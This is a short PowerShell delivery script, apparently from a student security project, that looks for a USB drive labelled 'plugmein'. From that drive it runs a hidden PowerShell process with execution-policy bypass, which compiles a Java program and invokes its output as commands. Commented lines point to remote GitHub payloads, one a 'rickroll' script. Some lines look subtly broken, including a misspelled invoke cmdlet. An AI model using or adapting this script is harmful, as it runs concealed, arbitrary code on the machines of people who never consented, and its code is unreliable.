# powershell script that downloads payloads from the internet

# URL1: https://raw.githubusercontent.com/BlackPropaganda/delivery/main/java/Main.java          | Java
# URL2: https://raw.githubusercontent.com/BlackPropaganda/delivery/main/python/run_rickroll.py  | python
# $PSDefaultParameterValues['Out-File:Encoding']='UTF8'
# $url1 = "https://raw.githubusercontent.com/BlackPropaganda/delivery/main/java/Main.java"
# $url2 = "https://raw.githubusercontent.com/BlackPropaganda/delivery/main/python/run_rickroll.py"

# Phase1
$DRIVE_LABEL = "plugmein"
$DRIVE = (Get-Volume -FileSystemLabel $DRIVE_LABEL).DriveLetter
$DIR = ${DRIVE}/CS362/delivery/
Powershell.exe -Exec Bypass -w hidden "cd ${DIR}/java; javac Main.java; $commands = java Main; InvokeExpression $commands"
exit();
